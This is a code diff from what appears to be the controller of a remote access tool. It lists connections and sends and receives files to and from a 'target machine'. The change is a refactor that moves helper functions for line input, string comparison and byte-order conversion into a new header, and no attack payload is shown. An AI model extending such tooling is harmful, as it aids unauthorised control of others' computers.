@@ -7,12 +7,9 @@ Use this code educationally/legally.
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include "sakito_tools.h"
 
-#pragma comment (lib, "ws2_32.lib")
-
-#define BUFLEN 8192
-// Default allocation for conns.clients (to repeat repititive calls to realloc/reduce computations).
-#define MEM_CHUNK 5
+#pragma comment(lib, "ws2_32.lib")
 
 typedef struct {
 	// Client hostname.
@@ -123,32 +120,6 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 	}
 }
 
-// Function to read/store stdin until \n is detected.
-size_t get_line(char* const buf) {
-	char c;
-	size_t cmd_len = 0;
-
-	buf[cmd_len++] = '0';
-	c = getchar();
-
-	while (c != '\n' && cmd_len < BUFLEN) {
-		buf[cmd_len++] = c;
-		c = getchar();
-	}
-
-	return cmd_len;
-}
-
-// Function to compare two strings (combined logic of strcmp and strncmp).
-int compare(const char* buf, const char* str) {
-	for (int j = 0; str[j] != '\0'; j++) {
-		if (str[j] != buf[j])
-			return 0;
-	}
-
-	return 1;
-}
-
 // Function to list all available connections.
 void list_connections(const Conn_map* conns) {
 	printf("\n\n---------------------------\n");
@@ -211,15 +182,6 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	}
 
 	return iResult;
-}
-
-// Function to copy int bytes to new memory block/location to abide strict aliasing.
-inline uint32_t ntohl_conv(char* const buf) {
-	uint32_t new;
-	memcpy(&new, buf, sizeof(new));
-
-	// Return deserialized bytes.
-	return ntohl(new);
 }
 
 // Function to receive file from target machine (TCP file transfer).
